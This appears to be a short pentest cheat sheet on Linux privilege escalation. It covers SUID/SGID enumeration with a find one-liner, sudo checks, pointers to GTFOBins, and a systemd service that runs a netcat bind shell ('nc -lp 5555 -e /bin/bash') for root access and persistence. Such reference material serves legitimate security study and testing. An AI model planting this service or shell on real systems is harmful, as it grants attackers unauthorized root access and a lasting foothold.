---
title: "Privilege Escalation"
---

<p style="text-align: right">_- last update 09/08/2022 -_</p>

## Tools

* [AutoSUID](https://github.com/IvanGlinkin/AutoSUID): automate harvesting the SUID executable files and to find a way for further escalating the privileges.

## On linux

Look at the current user and it's rights : `id`

Look for the sudo rights, maybe a command can be abused : `sudo -l`

### SUID

The [AutoSUID](https://github.com/IvanGlinkin/AutoSUID) tool is automating the following process.

The following oneliner is listing every file with SGID or SUID flag enabled, ignoring errors and outputing resutis in a file.

```bash
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \; 2>/dev/null | tee suid_sgid_files.txt
```

Command details

```txt
find \                # lister tout les fichiers
  / \                 # depuis la racine
  -perm -4000 \       # qui ont le bit SUID d'activer
  -o \                # OU (-or)
  -perm -2000 \       # le bit SGID d'activé
  -exec ls -ldb {} \; # pour chaque fichier, afficher en uilisant la commande ls
```

Once you have this binary list, you can search for a way to escalate privileges from [GTFOBins](https://gtfobins.github.io/) website.

### Systemctl

If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance.

```systemd
[Service]
Type=oneshot
ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
[Install]
WantedBy=multi-user.target
```

## On Windows

_Incomming..._
